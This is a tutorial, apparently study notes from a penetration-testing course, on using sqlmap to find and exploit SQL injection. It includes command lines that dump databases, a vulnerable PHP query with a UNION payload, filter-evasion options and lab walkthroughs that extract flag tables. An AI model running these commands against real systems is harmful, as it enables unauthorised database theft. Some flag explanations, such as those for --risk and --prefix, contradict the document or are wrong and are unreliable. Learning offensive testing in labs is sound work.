# SQLMap Usage Guide
## Installation
To install the latest version of `sqlmap`, run the following command:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

This clones the repository with the latest code and places it in a directory named sqlmap-dev.
## Usage
### Testing Against URLs
You can also test URLs with:
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
```
- `-u` is used to provide the target URL
- `--batch` is used for skipping any required user-input, by automatically choosing using the default option.
- `--dump` dumps all the information found
### Testing on HTTP Requests
Utilizing `Copy as cURL` feature from within the Network (Monitor) panel in the Developer Tools:
![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command
### GET/POST Requests
`GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used, as follows:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
- In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulnerability.

If we only want to focus on one section, we could mark it inside the provided data with the usage of special marker `*` as follows:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
### Full HTTP Requests
Follow these steps to test a web application for SQL injection vulnerabilities using sqlmap:

1. Capture the POST request: First, capture the POST request made by the client (usually after login) using a proxy tool such as Burp Suite or Wireshark.
2. Identify the Vulnerable Parameter: Locate the parameter in the captured request that may be vulnerable to SQL injection. This is typically a user input field, like the username or password field.
3. Create the Request File: Place the entire captured POST request in a plain text file (e.g., r.txt). Make sure to replace the vulnerable parameter value with * to indicate the location of the SQL injection.
4. Run sqlmap: Execute sqlmap with the -r option, providing the request file as input.
```bash
sqlmap -r r.txt
```
5. Display Database Tables: To list all tables in the database, add the --tables option to the command.
```bash
sqlmap -r r.txt --tables
```
### Custom SQLMap Requests
There are numerous switches and options to fine-tune SQLMap.

For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:
```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:
```bash
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
- We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`

There is a switch `--random-agent` designed to randomly select a `User-agent` header value from the included database of regular browser values.
- More and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value
- Alternatively, the `--mobile` switch can be used to imitate the smartphone

It is possible to test the headers for the SQLi vulnerability.
- To specify the "custom" injection mark after the header's value: `--cookie="id=1*"`

if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`:
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```
### Custom HTTP Requests
SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.

In case the `POST` body is relatively simple and short, the option `--data` will suffice.

However, in the case of a complex or long POST body, we can once again use the `-r` 
## Attack Tuning
### Prefix/Suffix
There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  

For such runs, options `--prefix` and `--suffix` can be used as follows:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.

For example, if the vulnerable code at the target is:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -`, will result in the following (valid) SQL statement at the target:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```
### Level/Risk
There is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap with the options `--level` and `--risk`:
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

The best way to check for differences between used boundaries and payloads for different values of `--level` and `--risk`, is the usage of `-v` option to set the verbosity level.
- Payloads used with the default `--level` value have a considerably smaller set of boundaries.
- By default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.

In special cases of SQLi vulnerabilities, where usage of `OR` payloads is a must (e.g., in case of `login` pages), we may have to raise the risk level ourselves.

This is because `OR` payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. `DELETE` or `UPDATE`).
### Advanced Tuning
To further fine-tune the detection mechanism, there is a hefty set of switches and options.
#### Status Codes
For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between `TRUE` and `FALSE` responses could be used for detection purposes. 

If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).
#### Titles
If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.
#### Strings
In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).
#### Text-only
When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.
#### Techniques
In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.
#### UNION SQLi Tuning
In some cases, `UNION` SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).  

Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.
#### Examples
##### Detect and exploit (OR) SQLi vulnerability in GET parameter id:
1. We capture the request, put a `*` in front of the `id` in the request, save it as `Case5.txt`
2. Then run the following
```bash
sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries
```
- `--no-cast`: This option disables automatic type casting of data. When enabled, `sqlmap` tries to cast data types (e.g., converting strings to integers), which might not be necessary or could lead to incorrect results. Disabling it can sometimes provide more accurate outcomes.
- `--dbms=MySQL`: This flag specifies the database management system to target. By setting it to `MySQL`, you instruct `sqlmap` to use techniques specifically for exploiting MySQL databases.
- `--technique=T`: This option tells sqlmap to use only the “time-based blind” SQL injection technique for testing. The “T” represents time-based blind SQL injection, which relies on the time it takes to receive a response to infer information about the database.
- `--time-sec=10`: Sets the number of seconds to wait before considering a response to be delayed. In this case, sqlmap will wait for 10 seconds to determine if the server is responding slowly, which helps in time-based SQL injection techniques.
- `--level=5`: This option sets the level of tests to perform. Levels range from 1 to 5, with level 5 being the most thorough. It increases the number of tests that sqlmap conducts, which can lead to a better chance of discovering vulnerabilities.
- `--risk=3`: Sets the risk level for tests. Risk levels range from 0 to 3, with 3 being the highest. Higher risk levels enable more aggressive tests, which may be more likely to exploit vulnerabilities.
- `--fresh-queries`: This flag tells sqlmap to ignore cached data and to re-execute all queries against the database. This ensures that any changes to the database since the last query execution are accounted for.
##### Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries
1. Capture request
2. Put `*` in front of `col`
3. Run the following
```bash
sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='`)'
```
- `--prefix=`: This flag allows you to specify a prefix to prepend to the extracted data.
##### Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique
1. Capture request
2. Put `*` in front of `id`
3. Run the following
```bash
sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL
```
- `--union-cols=5`: Specifies the number of columns to be used in a UNION query during the SQL injection exploitation. By setting this flag to 5, you are instructing sqlmap to assume that the vulnerable query returns 5 columns. This is important for constructing valid UNION queries, as both the original and injected queries must have the same number of columns to work correctly.